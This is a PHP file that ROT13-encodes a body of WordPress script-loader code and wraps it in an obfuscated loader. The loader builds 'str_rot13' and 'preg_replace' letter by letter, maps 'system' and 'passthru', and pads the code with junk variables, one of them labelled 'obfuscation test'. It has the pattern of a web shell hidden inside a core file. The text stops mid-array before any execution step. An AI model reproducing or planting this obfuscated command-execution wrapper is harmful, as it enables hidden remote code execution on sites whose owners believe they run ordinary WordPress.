<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff fpevcgf naq fglyrf qrsnhyg ybnqre.
 *
 * Frireny pbafgnagf ner hfrq gb znantr gur ybnqvat, pbapngrangvat naq pbzcerffvba bs fpevcgf naq PFF:
 * qrsvar('FPEVCG_QROHT', gehr); ybnqf gur qrirybczrag (aba-zvavsvrq) irefvbaf bs nyy fpevcgf naq PFF, naq qvfnoyrf pbzcerffvba naq pbapngrangvba,
 * qrsvar('PBAPNGRANGR_FPEVCGF', snyfr); qvfnoyrf pbzcerffvba naq pbapngrangvba bs fpevcgf naq PFF,
 * qrsvar('PBZCERFF_FPEVCGF', snyfr); qvfnoyrf pbzcerffvba bs fpevcgf,
 * qrsvar('PBZCERFF_PFF', snyfr); qvfnoyrf pbzcerffvba bs PFF,
 * qrsvar('RASBEPR_TMVC', gehr); sbeprf tmvc sbe pbzcerffvba (qrsnhyg vf qrsyngr).
 *
 * Gur tybonyf $pbapngrangr_fpevcgf, $pbzcerff_fpevcgf naq $pbzcerff_pff pna or frg ol cyhtvaf
 * gb grzcbenevyl bireevqr gur nobir frggvatf. Nyfb n pbzcerffvba grfg vf eha bapr naq gur erfhyg vf fnirq
 * nf bcgvba 'pna_pbzcerff_fpevcgf' (0/1). Gur grfg jvyy eha ntnva vs gung bcgvba vf qryrgrq.
 *
 * @cnpxntr JbeqCerff
 */

/** JbeqCerff Qrcraqrapl Pynff */
erdhver NOFCNGU . JCVAP . '/pynff-jc-qrcraqrapl.cuc';

/** JbeqCerff Qrcraqrapvrf Pynff */
erdhver NOFCNGU . JCVAP . '/pynff-jc-qrcraqrapvrf.cuc';

/** JbeqCerff Fpevcgf Pynff */
erdhver NOFCNGU . JCVAP . '/pynff-jc-fpevcgf.cuc';

/** JbeqCerff Fpevcgf Shapgvbaf */
erdhver NOFCNGU . JCVAP . '/shapgvbaf.jc-fpevcgf.cuc';

/** JbeqCerff Fglyrf Pynff */
erdhver NOFCNGU . JCVAP . '/pynff-jc-fglyrf.cuc';

/** JbeqCerff Fglyrf Shapgvbaf */
erdhver NOFCNGU . JCVAP . '/shapgvbaf.jc-fglyrf.cuc';

/**
 * Ertvfgref GvalZPR fpevcgf.
 *
 * @fvapr 5.0.0
 *
 * @tybony fgevat $gvalzpr_irefvba
 * @tybony obby   $pbapngrangr_fpevcgf
 * @tybony obby   $pbzcerff_fpevcgf
 *
 * @cnenz JC_Fpevcgf $fpevcgf            JC_Fpevcgf bowrpg.
 * @cnenz obby       $sbepr_hapbzcerffrq Jurgure gb sbepvoyl cerirag tmvc pbzcerffvba. Qrsnhyg snyfr.
 */
shapgvba jc_ertvfgre_gvalzpr_fpevcgf( $fpevcgf, $sbepr_hapbzcerffrq = snyfr ) {
	tybony $gvalzpr_irefvba, $pbapngrangr_fpevcgf, $pbzcerff_fpevcgf;

	$fhssvk     = jc_fpevcgf_trg_fhssvk();
	$qri_fhssvk = jc_fpevcgf_trg_fhssvk( 'qri' );

	fpevcg_pbapng_frggvatf();

	$pbzcerffrq = $pbzcerff_fpevcgf && $pbapngrangr_fpevcgf && ! $sbepr_hapbzcerffrq;

	/*
	 * Ybnq gvalzpr.wf jura ehaavat sebz /fep, bgurejvfr ybnq jc-gvalzpr.wf (va cebqhpgvba)
	 * be gvalzpr.zva.wf (jura FPEVCG_QROHT vf gehr).
	 */
	vs ( $pbzcerffrq ) {
		$fpevcgf->nqq( 'jc-gvalzpr', vapyhqrf_hey( 'wf/gvalzpr/' ) . 'jc-gvalzpr.wf', neenl(), $gvalzpr_irefvba );
	} ryfr {
		$fpevcgf->nqq( 'jc-gvalzpr-ebbg', vapyhqrf_hey( 'wf/gvalzpr/' ) . \"gvalzpr$qri_fhssvk.wf\", neenl(), $gvalzpr_irefvba );
		$fpevcgf->nqq( 'jc-gvalzpr', vapyhqrf_hey( 'wf/gvalzpr/' ) . \"cyhtvaf/pbzcng3k/cyhtva$qri_fhssvk.wf\", neenl( 'jc-gvalzpr-ebbg' ), $gvalzpr_irefvba );
	}

	$fpevcgf->nqq( 'jc-gvalzpr-yvfgf', vapyhqrf_hey( \"wf/gvalzpr/cyhtvaf/yvfgf/cyhtva$fhssvk.wf\" ), neenl( 'jc-gvalzpr' ), $gvalzpr_irefvba );
}

/**
 * Ertvfgref nyy gur JbeqCerff iraqbe fpevcgf gung ner va gur fgnaqneqvmrq
 * `wf/qvfg/iraqbe/` ybpngvba.
 *
 * Sbe gur beqre bs `$fpevcgf->nqq` frr `jc_qrsnhyg_fpevcgf`.
 *
 * @fvapr 5.0.0
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 */
shapgvba jc_qrsnhyg_cnpxntrf_iraqbe( $fpevcgf ) {
	tybony $jc_ybpnyr;

	$fhssvk = jc_fpevcgf_trg_fhssvk();

	$iraqbe_fpevcgf = neenl(
		'ernpg',
		'ernpg-qbz'         => neenl( 'ernpg' ),
		'ernpg-wfk-ehagvzr' => neenl( 'ernpg' ),
		'ertrarengbe-ehagvzr',
		'zbzrag',
		'ybqnfu',
		'jc-cbylsvyy-srgpu',
		'jc-cbylsvyy-sbezqngn',
		'jc-cbylsvyy-abqr-pbagnvaf',
		'jc-cbylsvyy-hey',
		'jc-cbylsvyy-qbz-erpg',
		'jc-cbylsvyy-ryrzrag-pybfrfg',
		'jc-cbylsvyy-bowrpg-svg',
		'jc-cbylsvyy-vareg',
		'jc-cbylsvyy',
	);

	$iraqbe_fpevcgf_irefvbaf = neenl(
		'ernpg'                       => '18.3.1.1', // Svany .1 qhr gb fjvgpu gb HZQ ohvyq, pna or erzbirq va gur arkg hcqngr.
		'ernpg-qbz'                   => '18.3.1.1', // Svany .1 qhr gb fjvgpu gb HZQ ohvyq, pna or erzbirq va gur arkg hcqngr.
		'ernpg-wfk-ehagvzr'           => '18.3.1',
		'ertrarengbe-ehagvzr'         => '0.14.1',
		'zbzrag'                      => '2.30.1',
		'ybqnfu'                      => '4.17.21',
		'jc-cbylsvyy-srgpu'           => '3.6.20',
		'jc-cbylsvyy-sbezqngn'        => '4.0.10',
		'jc-cbylsvyy-abqr-pbagnvaf'   => '4.8.0',
		'jc-cbylsvyy-hey'             => '3.6.4',
		'jc-cbylsvyy-qbz-erpg'        => '4.8.0',
		'jc-cbylsvyy-ryrzrag-pybfrfg' => '3.0.2',
		'jc-cbylsvyy-bowrpg-svg'      => '2.3.5',
		'jc-cbylsvyy-vareg'           => '3.1.3',
		'jc-cbylsvyy'                 => '3.15.0',
	);

	sbernpu ( $iraqbe_fpevcgf nf $unaqyr => $qrcraqrapvrf ) {
		vs ( vf_fgevat( $qrcraqrapvrf ) ) {
			$unaqyr       = $qrcraqrapvrf;
			$qrcraqrapvrf = neenl();
		}

		$cngu    = \"/jc-vapyhqrf/wf/qvfg/iraqbe/$unaqyr$fhssvk.wf\";
		$irefvba = $iraqbe_fpevcgf_irefvbaf[ $unaqyr ];

		$fpevcgf->nqq( $unaqyr, $cngu, $qrcraqrapvrf, $irefvba, 1 );
	}

	qvq_npgvba( 'vavg' ) && $fpevcgf->nqq_vayvar_fpevcg( 'ybqnfu', 'jvaqbj.ybqnfu = _.abPbasyvpg();' );

	qvq_npgvba( 'vavg' ) && $fpevcgf->nqq_vayvar_fpevcg(
		'zbzrag',
		fcevags(
			\"zbzrag.hcqngrYbpnyr( '%f', %f );\",
			rfp_wf( trg_hfre_ybpnyr() ),
			jc_wfba_rapbqr(
				neenl(
					'zbaguf'         => neenl_inyhrf( $jc_ybpnyr->zbagu ),
					'zbagufFubeg'    => neenl_inyhrf( $jc_ybpnyr->zbagu_nooeri ),
					'jrrxqnlf'       => neenl_inyhrf( $jc_ybpnyr->jrrxqnl ),
					'jrrxqnlfFubeg'  => neenl_inyhrf( $jc_ybpnyr->jrrxqnl_nooeri ),
					'jrrx'           => neenl(
						'qbj' => (vag) trg_bcgvba( 'fgneg_bs_jrrx', 0 ),
					),
					'ybatQngrSbezng' => neenl(
						'YG'   => trg_bcgvba( 'gvzr_sbezng', __( 't:v n' ) ),
						'YGF'  => ahyy,
						'Y'    => ahyy,
						'YY'   => trg_bcgvba( 'qngr_sbezng', __( 'S w, L' ) ),
						'YYY'  => __( 'S w, L t:v n' ),
						'YYYY' => ahyy,
					),
				)
			)
		),
		'nsgre'
	);
}

/**
 * Ergheaf pbagragf bs na vayvar fpevcg hfrq va nccraqvat cbylsvyy fpevcgf sbe
 * oebjfref juvpu snvy gur cebivqrq grfgf. Gur cebivqrq neenl vf n znccvat sebz
 * n pbaqvgvba gb irevsl srngher fhccbeg gb vgf cbylsvyy fpevcg unaqyr.
 *
 * @fvapr 5.0.0
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 * @cnenz fgevat[]   $grfgf   Srngherf gb qrgrpg.
 * @erghea fgevat Pbaqvgvbany cbylsvyy vayvar fpevcg.
 */
shapgvba jc_trg_fpevcg_cbylsvyy( $fpevcgf, $grfgf ) {
	$cbylsvyy = '';
	sbernpu ( $grfgf nf $grfg => $unaqyr ) {
		vs ( ! neenl_xrl_rkvfgf( $unaqyr, $fpevcgf->ertvfgrerq ) ) {
			pbagvahr;
		}

		$fep = $fpevcgf->ertvfgrerq[ $unaqyr ]->fep;
		$ire = $fpevcgf->ertvfgrerq[ $unaqyr ]->ire;

		vs ( ! cert_zngpu( '|^(uggcf?:)?//|', $fep ) && ! ( $fpevcgf->pbagrag_hey && fge_fgnegf_jvgu( $fep, $fpevcgf->pbagrag_hey ) ) ) {
			$fep = $fpevcgf->onfr_hey . $fep;
		}

		vs ( ! rzcgl( $ire ) ) {
			$fep = nqq_dhrel_net( 'ire', $ire, $fep );
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-fpevcgf.cuc */
		$fep = rfp_hey( nccyl_svygref( 'fpevcg_ybnqre_fep', $fep, $unaqyr ) );

		vs ( ! $fep ) {
			pbagvahr;
		}

		$cbylsvyy .= (
			// Grfg cerfrapr bs srngher...
			'( ' . $grfg . ' ) || ' .
			/*
			 * ...nccraqvat cbylsvyy ba nal snvyherf. Pnhgvbhf ivrjref znl onyx
			 * ng gur `qbphzrag.jevgr`. Vgf pnirng bs flapuebabhf zvq-fgernz
			 * oybpxvat jevgr vf rknpgyl gur orunivbe jr arrq gubhtu.
			 */
			'qbphzrag.jevgr( \'<fpevcg fep=\"' .
			$fep .
			'\"></fpe\' + \'vcg>\' );'
		);
	}

	erghea $cbylsvyy;
}

/**
 * Ertvfgref qrirybczrag fpevcgf gung vagrtengr jvgu `@jbeqcerff/fpevcgf`.
 *
 * @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/gerr/gehax/cnpxntrf/fpevcgf#fgneg
 *
 * @fvapr 6.0.0
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 */
shapgvba jc_ertvfgre_qrirybczrag_fpevcgf( $fpevcgf ) {
	vs (
		! qrsvarq( 'FPEVCG_QROHT' ) || ! FPEVCG_QROHT
		|| rzcgl( $fpevcgf->ertvfgrerq['ernpg'] )
		|| qrsvarq( 'JC_EHA_PBER_GRFGF' )
	) {
		erghea;
	}

	$qrirybczrag_fpevcgf = neenl(
		'ernpg-erserfu-ragel',
		'ernpg-erserfu-ehagvzr',
	);

	sbernpu ( $qrirybczrag_fpevcgf nf $fpevcg_anzr ) {
		$nffrgf = vapyhqr NOFCNGU . JCVAP . '/nffrgf/fpevcg-ybnqre-' . $fpevcg_anzr . '.cuc';
		vs ( ! vf_neenl( $nffrgf ) ) {
			erghea;
		}
		$fpevcgf->nqq(
			'jc-' . $fpevcg_anzr,
			'/jc-vapyhqrf/wf/qvfg/qrirybczrag/' . $fpevcg_anzr . '.wf',
			$nffrgf['qrcraqrapvrf'],
			$nffrgf['irefvba']
		);
	}

	// Frr uggcf://tvguho.pbz/czzzju/ernpg-erserfu-jrocnpx-cyhtva/oybo/znva/qbpf/GEBHOYRFUBBGVAT.zq#rkgreanyvfvat-ernpg.
	$fpevcgf->ertvfgrerq['ernpg']->qrcf[] = 'jc-ernpg-erserfu-ragel';
}

/**
 * Ertvfgref nyy gur JbeqCerff cnpxntrf fpevcgf gung ner va gur fgnaqneqvmrq
 * `wf/qvfg/` ybpngvba.
 *
 * Sbe gur beqre bs `$fpevcgf->nqq` frr `jc_qrsnhyg_fpevcgf`.
 *
 * @fvapr 5.0.0
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 */
shapgvba jc_qrsnhyg_cnpxntrf_fpevcgf( $fpevcgf ) {
	$fhssvk = qrsvarq( 'JC_EHA_PBER_GRFGF' ) ? '.zva' : jc_fpevcgf_trg_fhssvk();
	/*
	 * Rkcrpgf zhygvqvzrafvbany neenl yvxr:
	 *
	 *     'n11l.wf' => neenl('qrcraqrapvrf' => neenl(...), 'irefvba' => '...'),
	 *     'naabgngvbaf.wf' => neenl('qrcraqrapvrf' => neenl(...), 'irefvba' => '...'),
	 *     'ncv-srgpu.wf' => neenl(...
	 */
	$nffrgf = vapyhqr NOFCNGU . JCVAP . \"/nffrgf/fpevcg-ybnqre-cnpxntrf{$fhssvk}.cuc\";

	sbernpu ( $nffrgf nf $svyr_anzr => $cnpxntr_qngn ) {
		$onfranzr = fge_ercynpr( $fhssvk . '.wf', '', onfranzr( $svyr_anzr ) );
		$unaqyr   = 'jc-' . $onfranzr;
		$cngu     = \"/jc-vapyhqrf/wf/qvfg/{$onfranzr}{$fhssvk}.wf\";

		vs ( ! rzcgl( $cnpxntr_qngn['qrcraqrapvrf'] ) ) {
			$qrcraqrapvrf = $cnpxntr_qngn['qrcraqrapvrf'];
		} ryfr {
			$qrcraqrapvrf = neenl();
		}

		// Nqq qrcraqrapvrf gung pnaabg or qrgrpgrq naq trarengrq ol ohvyq gbbyf.
		fjvgpu ( $unaqyr ) {
			pnfr 'jc-oybpx-yvoenel':
				neenl_chfu( $qrcraqrapvrf, 'rqvgbe' );
				oernx;
			pnfr 'jc-rqvg-cbfg':
				neenl_chfu( $qrcraqrapvrf, 'zrqvn-zbqryf', 'zrqvn-ivrjf', 'cbfgobk', 'jc-qbz-ernql' );
				oernx;
			pnfr 'jc-cersreraprf':
				neenl_chfu( $qrcraqrapvrf, 'jc-cersreraprf-crefvfgrapr' );
				oernx;
		}

		$fpevcgf->nqq( $unaqyr, $cngu, $qrcraqrapvrf, $cnpxntr_qngn['irefvba'], 1 );

		vs ( va_neenl( 'jc-v18a', $qrcraqrapvrf, gehr ) ) {
			$fpevcgf->frg_genafyngvbaf( $unaqyr );
		}

		/*
		 * Znahnyyl frg gur grkg qverpgvba ybpnyvmngvba nsgre jc-v18a vf cevagrq.
		 * Guvf rafherf gung jc.v18a.vfEGY() ergheaf gehr va EGY ynathntrf.
		 * Jr pnaabg hfr $fpevcgf->frg_genafyngvbaf( 'jc-v18a' ) gb qb guvf
		 * orpnhfr JbeqCerff cevagf n fpevcg'f genafyngvbaf *orsber* gur fpevcg,
		 * juvpu zrnaf, va gur pnfr bs jc-v18a, gung jc.v18a.frgYbpnyrQngn()
		 * vf pnyyrq orsber jc.v18a vf qrsvarq.
		 */
		vs ( 'jc-v18a' === $unaqyr ) {
			$yge    = _k( 'yge', 'grkg qverpgvba' );
			$fpevcg = fcevags( \"jc.v18a.frgYbpnyrQngn( { 'grkg qverpgvba\h0004yge': [ '%f' ] } );\", $yge );
			$fpevcgf->nqq_vayvar_fpevcg( $unaqyr, $fpevcg, 'nsgre' );
		}
	}
}

/**
 * Nqqf vayvar fpevcgf erdhverq sbe gur JbeqCerff WninFpevcg cnpxntrf.
 *
 * @fvapr 5.0.0
 * @fvapr 6.4.0 Nqqrq eryngvir gvzr fgevatf sbe gur `jc-qngr` vayvar fpevcg bhgchg.
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 * @tybony jcqo      $jcqo      JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 */
shapgvba jc_qrsnhyg_cnpxntrf_vayvar_fpevcgf( $fpevcgf ) {
	tybony $jc_ybpnyr, $jcqo;

	vs ( vffrg( $fpevcgf->ertvfgrerq['jc-ncv-srgpu'] ) ) {
		$fpevcgf->ertvfgrerq['jc-ncv-srgpu']->qrcf[] = 'jc-ubbxf';
	}
	$fpevcgf->nqq_vayvar_fpevcg(
		'jc-ncv-srgpu',
		fcevags(
			'jc.ncvSrgpu.hfr( jc.ncvSrgpu.perngrEbbgHEYZvqqyrjner( \"%f\" ) );',
			fnavgvmr_hey( trg_erfg_hey() )
		),
		'nsgre'
	);
	$fpevcgf->nqq_vayvar_fpevcg(
		'jc-ncv-srgpu',
		vzcybqr(
			\"\a\",
			neenl(
				fcevags(
					'jc.ncvSrgpu.abaprZvqqyrjner = jc.ncvSrgpu.perngrAbaprZvqqyrjner( \"%f\" );',
					jc_vafgnyyvat() ? '' : jc_perngr_abapr( 'jc_erfg' )
				),
				'jc.ncvSrgpu.hfr( jc.ncvSrgpu.abaprZvqqyrjner );',
				'jc.ncvSrgpu.hfr( jc.ncvSrgpu.zrqvnHcybnqZvqqyrjner );',
				fcevags(
					'jc.ncvSrgpu.abaprRaqcbvag = \"%f\";',
					nqzva_hey( 'nqzva-nwnk.cuc?npgvba=erfg-abapr' )
				),
			)
		),
		'nsgre'
	);

	$zrgn_xrl     = $jcqo->trg_oybt_cersvk() . 'crefvfgrq_cersreraprf';
	$hfre_vq      = trg_pheerag_hfre_vq();
	$cerybnq_qngn = trg_hfre_zrgn( $hfre_vq, $zrgn_xrl, gehr );
	$fpevcgf->nqq_vayvar_fpevcg(
		'jc-cersreraprf',
		fcevags(
			'( shapgvba() {
				ine freireQngn = %f;
				ine hfreVq = \"%q\";
				ine crefvfgraprYnlre = jc.cersreraprfCrefvfgrapr.__hafgnoyrPerngrCrefvfgraprYnlre( freireQngn, hfreVq );
				ine cersreraprfFgber = jc.cersreraprf.fgber;
				jc.qngn.qvfcngpu( cersreraprfFgber ).frgCrefvfgraprYnlre( crefvfgraprYnlre );
			} ) ();',
			jc_wfba_rapbqr( $cerybnq_qngn ),
			$hfre_vq
		)
	);

	// Onpxjneqf pbzcngvovyvgl - pbasvther gur byq jc-qngn crefvfgrapr flfgrz.
	$fpevcgf->nqq_vayvar_fpevcg(
		'jc-qngn',
		vzcybqr(
			\"\a\",
			neenl(
				'( shapgvba() {',
				'	ine hfreVq = ' . trg_pheerag_hfre_vq() . ';',
				'	ine fgbentrXrl = \"JC_QNGN_HFRE_\" + hfreVq;',
				'	jc.qngn',
				'		.hfr( jc.qngn.cyhtvaf.crefvfgrapr, { fgbentrXrl: fgbentrXrl } );',
				'} )();',
			)
		)
	);

	// Pnyphyngr gur gvzrmbar nooe (RQG, CFG) vs cbffvoyr.
	$gvzrmbar_fgevat = trg_bcgvba( 'gvzrmbar_fgevat', 'HGP' );
	$gvzrmbar_nooe   = '';

	vs ( ! rzcgl( $gvzrmbar_fgevat ) ) {
		$gvzrmbar_qngr = arj QngrGvzr( 'abj', arj QngrGvzrMbar( $gvzrmbar_fgevat ) );
		$gvzrmbar_nooe = $gvzrmbar_qngr->sbezng( 'G' );
	}

	$tzg_bssfrg = trg_bcgvba( 'tzg_bssfrg', 0 );

	$fpevcgf->nqq_vayvar_fpevcg(
		'jc-qngr',
		fcevags(
			'jc.qngr.frgFrggvatf( %f );',
			jc_wfba_rapbqr(
				neenl(
					'y10a'     => neenl(
						'ybpnyr'        => trg_hfre_ybpnyr(),
						'zbaguf'        => neenl_inyhrf( $jc_ybpnyr->zbagu ),
						'zbagufFubeg'   => neenl_inyhrf( $jc_ybpnyr->zbagu_nooeri ),
						'jrrxqnlf'      => neenl_inyhrf( $jc_ybpnyr->jrrxqnl ),
						'jrrxqnlfFubeg' => neenl_inyhrf( $jc_ybpnyr->jrrxqnl_nooeri ),
						'zrevqvrz'      => (bowrpg) $jc_ybpnyr->zrevqvrz,
						'eryngvir'      => neenl(
							/* genafyngbef: %f: Qhengvba. */
							'shgher' => __( '%f sebz abj' ),
							/* genafyngbef: %f: Qhengvba. */
							'cnfg'   => __( '%f ntb' ),
							/* genafyngbef: Bar frpbaq sebz be gb n cnegvphyne qngrgvzr, r.t., \"n frpbaq ntb\" be \"n frpbaq sebz abj\". */
							'f'      => __( 'n frpbaq' ),
							/* genafyngbef: %q: Qhengvba va frpbaqf sebz be gb n cnegvphyne qngrgvzr, r.t., \"4 frpbaqf ntb\" be \"4 frpbaqf sebz abj\". */
							'ff'     => __( '%q frpbaqf' ),
							/* genafyngbef: Bar zvahgr sebz be gb n cnegvphyne qngrgvzr, r.t., \"n zvahgr ntb\" be \"n zvahgr sebz abj\". */
							'z'      => __( 'n zvahgr' ),
							/* genafyngbef: %q: Qhengvba va zvahgrf sebz be gb n cnegvphyne qngrgvzr, r.t., \"4 zvahgrf ntb\" be \"4 zvahgrf sebz abj\". */
							'zz'     => __( '%q zvahgrf' ),
							/* genafyngbef: Bar ubhe sebz be gb n cnegvphyne qngrgvzr, r.t., \"na ubhe ntb\" be \"na ubhe sebz abj\". */
							'u'      => __( 'na ubhe' ),
							/* genafyngbef: %q: Qhengvba va ubhef sebz be gb n cnegvphyne qngrgvzr, r.t., \"4 ubhef ntb\" be \"4 ubhef sebz abj\". */
							'uu'     => __( '%q ubhef' ),
							/* genafyngbef: Bar qnl sebz be gb n cnegvphyne qngrgvzr, r.t., \"n qnl ntb\" be \"n qnl sebz abj\". */
							'q'      => __( 'n qnl' ),
							/* genafyngbef: %q: Qhengvba va qnlf sebz be gb n cnegvphyne qngrgvzr, r.t., \"4 qnlf ntb\" be \"4 qnlf sebz abj\". */
							'qq'     => __( '%q qnlf' ),
							/* genafyngbef: Bar zbagu sebz be gb n cnegvphyne qngrgvzr, r.t., \"n zbagu ntb\" be \"n zbagu sebz abj\". */
							'Z'      => __( 'n zbagu' ),
							/* genafyngbef: %q: Qhengvba va zbaguf sebz be gb n cnegvphyne qngrgvzr, r.t., \"4 zbaguf ntb\" be \"4 zbaguf sebz abj\". */
							'ZZ'     => __( '%q zbaguf' ),
							/* genafyngbef: Bar lrne sebz be gb n cnegvphyne qngrgvzr, r.t., \"n lrne ntb\" be \"n lrne sebz abj\". */
							'l'      => __( 'n lrne' ),
							/* genafyngbef: %q: Qhengvba va lrnef sebz be gb n cnegvphyne qngrgvzr, r.t., \"4 lrnef ntb\" be \"4 lrnef sebz abj\". */
							'll'     => __( '%q lrnef' ),
						),
						'fgnegBsJrrx'   => (vag) trg_bcgvba( 'fgneg_bs_jrrx', 0 ),
					),
					'sbezngf'  => neenl(
						/* genafyngbef: Gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
						'gvzr'                => trg_bcgvba( 'gvzr_sbezng', __( 't:v n' ) ),
						/* genafyngbef: Qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
						'qngr'                => trg_bcgvba( 'qngr_sbezng', __( 'S w, L' ) ),
						/* genafyngbef: Qngr/Gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
						'qngrgvzr'            => __( 'S w, L t:v n' ),
						/* genafyngbef: Nooerivngrq qngr/gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
						'qngrgvzrNooerivngrq' => __( 'Z w, L t:v n' ),
					),
					'gvzrmbar' => neenl(
						'bssfrg'          => (sybng) $tzg_bssfrg,
						'bssfrgSbeznggrq' => fge_ercynpr( neenl( '.25', '.5', '.75' ), neenl( ':15', ':30', ':45' ), (fgevat) $tzg_bssfrg ),
						'fgevat'          => $gvzrmbar_fgevat,
						'nooe'            => $gvzrmbar_nooe,
					),
				)
			)
		),
		'nsgre'
	);

	// Ybnqvat gur byq rqvgbe naq vgf pbasvt gb rafher gur pynffvp oybpx jbexf nf rkcrpgrq.
	$fpevcgf->nqq_vayvar_fpevcg(
		'rqvgbe',
		'jvaqbj.jc.byqRqvgbe = jvaqbj.jc.rqvgbe;',
		'nsgre'
	);

	/*
	 * jc-rqvgbe zbqhyr vf rkcbfrq nf jvaqbj.jc.rqvgbe.
	 * Ceboyrz: gurer vf dhvgr fbzr pbqr rkcrpgvat jvaqbj.jc.byqRqvgbe bowrpg ninvynoyr haqre jvaqbj.jc.rqvgbe.
	 * Fbyhgvba: shfr gur gjb bowrpgf gbtrgure gb znvagnva onpxjneq pbzcngvovyvgl.
	 * Sbe zber pbagrkg, frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/33203.
	 */
	$fpevcgf->nqq_vayvar_fpevcg(
		'jc-rqvgbe',
		'Bowrpg.nffvta( jvaqbj.jc.rqvgbe, jvaqbj.jc.byqRqvgbe );',
		'nsgre'
	);
}

/**
 * Nqqf vayvar fpevcgf erdhverq sbe gur GvalZPR va gur oybpx rqvgbe.
 *
 * Gurfr GvalZPR vavg frggvatf ner hfrq gb rkgraq naq bireevqr gur qrsnhyg frggvatf
 * sebz `_JC_Rqvgbef::qrsnhyg_frggvatf()` sbe gur Pynffvp oybpx.
 *
 * @fvapr 5.0.0
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf
 */
shapgvba jc_gvalzpr_vayvar_fpevcgf() {
	tybony $jc_fpevcgf;

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$rqvgbe_frggvatf = nccyl_svygref( 'jc_rqvgbe_frggvatf', neenl( 'gvalzpr' => gehr ), 'pynffvp-oybpx' );

	$gvalzpr_cyhtvaf = neenl(
		'puneznc',
		'pbybecvpxre',
		'ue',
		'yvfgf',
		'zrqvn',
		'cnfgr',
		'gnosbphf',
		'grkgpbybe',
		'shyyfperra',
		'jbeqcerff',
		'jcnhgberfvmr',
		'jcrqvgvzntr',
		'jcrzbwv',
		'jctnyyrel',
		'jcyvax',
		'jcqvnybtf',
		'jcgrkgcnggrea',
		'jcivrj',
	);

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$gvalzpr_cyhtvaf = nccyl_svygref( 'gval_zpr_cyhtvaf', $gvalzpr_cyhtvaf, 'pynffvp-oybpx' );
	$gvalzpr_cyhtvaf = neenl_havdhr( $gvalzpr_cyhtvaf );

	$qvfnoyr_pncgvbaf = snyfr;
	// Ehaf nsgre `gval_zpr_cyhtvaf` ohg orsber `zpr_ohggbaf`.
	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
	vs ( nccyl_svygref( 'qvfnoyr_pncgvbaf', '' ) ) {
		$qvfnoyr_pncgvbaf = gehr;
	}

	$gbbyone1 = neenl(
		'sbezngfryrpg',
		'obyq',
		'vgnyvp',
		'ohyyvfg',
		'ahzyvfg',
		'oybpxdhbgr',
		'nyvtayrsg',
		'nyvtapragre',
		'nyvtaevtug',
		'yvax',
		'hayvax',
		'jc_zber',
		'fcryypurpxre',
		'jc_nqq_zrqvn',
		'jc_nqi',
	);

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$gbbyone1 = nccyl_svygref( 'zpr_ohggbaf', $gbbyone1, 'pynffvp-oybpx' );

	$gbbyone2 = neenl(
		'fgevxrguebhtu',
		'ue',
		'sberpbybe',
		'cnfgrgrkg',
		'erzbirsbezng',
		'puneznc',
		'bhgqrag',
		'vaqrag',
		'haqb',
		'erqb',
		'jc_uryc',
	);

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$gbbyone2 = nccyl_svygref( 'zpr_ohggbaf_2', $gbbyone2, 'pynffvp-oybpx' );
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$gbbyone3 = nccyl_svygref( 'zpr_ohggbaf_3', neenl(), 'pynffvp-oybpx' );
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$gbbyone4 = nccyl_svygref( 'zpr_ohggbaf_4', neenl(), 'pynffvp-oybpx' );
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$rkgreany_cyhtvaf = nccyl_svygref( 'zpr_rkgreany_cyhtvaf', neenl(), 'pynffvp-oybpx' );

	$gvalzpr_frggvatf = neenl(
		'cyhtvaf'              => vzcybqr( ',', $gvalzpr_cyhtvaf ),
		'gbbyone1'             => vzcybqr( ',', $gbbyone1 ),
		'gbbyone2'             => vzcybqr( ',', $gbbyone2 ),
		'gbbyone3'             => vzcybqr( ',', $gbbyone3 ),
		'gbbyone4'             => vzcybqr( ',', $gbbyone4 ),
		'rkgreany_cyhtvaf'     => jc_wfba_rapbqr( $rkgreany_cyhtvaf ),
